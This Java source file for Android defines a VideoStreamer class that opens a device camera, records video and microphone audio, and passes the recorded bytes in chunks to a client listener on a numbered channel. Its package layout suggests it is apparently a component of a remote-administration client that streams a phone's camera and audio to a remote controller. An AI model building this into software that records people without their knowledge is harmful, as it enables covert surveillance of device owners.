package my.app.Library;

import android.app.Activity;
import android.hardware.Camera;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.util.Log;
import android.view.Surface;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.TextureView;
import my.app.client.ClientListener;
import android.content.Context;
import my.app.client.LauncherActivity;
import my.app.client.R;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class VideoStreamer {
    private Camera camera;
    private MediaRecorder mediaRecorder;
    private boolean streaming = false;
    private Thread stream;
    private ClientListener cl;
    private File tempstore;
    private FileInputStream fis;
    private int bytesRead = 0;
    private byte[] dataToSend;
    private int numCam = Camera.getNumberOfCameras();
    private int FrontCam = Camera.CameraInfo.CAMERA_FACING_FRONT;
    private int BackCam = Camera.CameraInfo.CAMERA_FACING_BACK;
    private int channel;
    private boolean isPrepared = false;
    private TextureView mPreview;

    public VideoStreamer(ClientListener c, byte[] args, int chan) {
        cl = c;
        channel = chan;
        if (numCam > 1) {
            if (args[0] == 0) {
                camera = Camera.open(BackCam);
            } else {
                camera = Camera.open(FrontCam);
            }
        } else {
            camera = Camera.open();
        }
        stream = new Thread(
                new Runnable() {
                    public void run() {
                        record();
                    }
                });
        /*SurfaceView surView = new SurfaceView(cl); //(SurfaceView)findViewById(R.layout.videoview);
        surHol = surView.getHolder();
        surHol.addCallback(this);*/
        try {
            tempstore = File.createTempFile("Tryingagain", null, cl.getCacheDir());
            boolean abc = tempstore.exists();
            fis = new FileInputStream(tempstore);
        } catch (Exception e) {
            Log.e("VideoStream", "Problem in creating File or Stream");


        }

    }

    public void record() {
        long available;
        byte[] buffer = new byte[4096];
        mPreview = cl.getPreview();
        prepare();
        mediaRecorder.start();
        try {
            while (streaming) {
                available = fis.available();
                //Log.i("MediaRecoder","Bytes aviable: "+available);
                if (available >0) {
                    bytesRead = fis.read(buffer, 0, buffer.length);
                    Log.i("MediaRecorder", "BytesRead: " + bytesRead);
                    if (bytesRead == -1) {
                        Log.i("Mediarecorder", "break weil keine daten");
                        break;
                    }
                    dataToSend = new byte[bytesRead];
                    System.arraycopy(buffer, 0, dataToSend, 0, bytesRead);
                    buffer = new byte[4096];
                    cl.handleData(channel, dataToSend);
                }

            }

        } catch (IOException e) {
            Log.e("Fis", "No Bytes read from inputStream");
        }
    }

    public void startStream() {
        streaming = true;
        stream.start();
    }

    public void stopStream() {
        try{
            mediaRecorder.stop();
        }catch(RuntimeException stopException){

        }
        streaming = false;
        mediaRecorder.reset();
        mediaRecorder.release();
        tempstore.delete();
        camera.release();
        mediaRecorder = null;
        camera = null;
    }

    public boolean prepare() {
        try {
            camera.setPreviewTexture(mPreview.getSurfaceTexture());
        }catch (IOException e){
         return  false;
        }

        mediaRecorder = new MediaRecorder();
        camera.unlock();
        mediaRecorder.setCamera(camera);
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H263);
        //mediaRecorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_HIGH));
        //mediaRecorder.setVideoFrameRate(60);
        mediaRecorder.setOutputFile(tempstore.getAbsolutePath());
        try {
            mediaRecorder.prepare();
            isPrepared = true;
        } catch (IOException | IllegalStateException e) {
            mediaRecorder.reset();
            mediaRecorder.release();
            return false;
        }
        return true;

    }
}